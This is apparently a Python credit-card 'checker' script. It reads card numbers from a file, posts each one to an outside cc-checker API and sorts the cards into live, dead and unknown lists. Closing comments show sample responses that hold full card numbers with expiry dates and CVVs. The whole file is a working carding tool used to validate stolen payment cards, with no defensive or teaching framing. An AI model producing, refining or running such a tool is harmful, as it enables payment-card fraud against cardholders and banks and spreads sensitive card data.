import requests
import json

base_url = "https://cc-checker.com/bin-checker/api.php"


with open("cc.txt", "r") as target:
    allCC = target.readlines()
live = []
die = []
unknow = []
for item in allCC:
    param = {"data": item}
    req = requests.post(base_url, data=param)
    res = json.loads(req.content)
    if res["error"] == 3:
        unknow.append(item)
        print(f"CC : {item}\nResponse : Unknow\n{50*'='}")
    elif res["error"] == 2:
        die.append(item)
        print(f"CC : {item}\nResponse : Die\n{50*'='}")
    elif res["error"] == 1:
        live.append(item)
        print(f"CC : {item}\nResponse : Live\n{50*'='}")
with open("lives.txt", "w") as fp:
    for item in live:
        fp.write(f"{item}\n")
with open("unknow.txt", "w") as fp:
    for item in unknow:
        fp.write(f"{item}\n")
with open("dies.txt", "w") as fp:
    for item in die:
        fp.write(f"{item}\n")


# {'error': 3, 'msg': "<div><b style='color:#800080;'>Unknown</b> | 5228400076971255|01|2022|575 | [GATE:01] @/ChkNET-ID</div>"}
# {'error': 2, 'msg': "<div><b style='color:#FF0000;'>Die</b> | 5228400076987806|05|2025|371 [GATE:01] @/Chk-codes-cD</div>"}
# {'error': 1, 'msg': "<div><b style='color:#008000;'>Live</b> | 5228400076978367|11|2024|803 [BIN: <b style='color:blue;'></b><b style='color:red;'> - </b><b style='color:blue;'></b><b style='color:red;'> - </b><b style='color:blue;'></b><b style='color:red;'> - </b><b style='color:blue;'></b>][GATE:01] @/binNET-Ihecker</div>"}
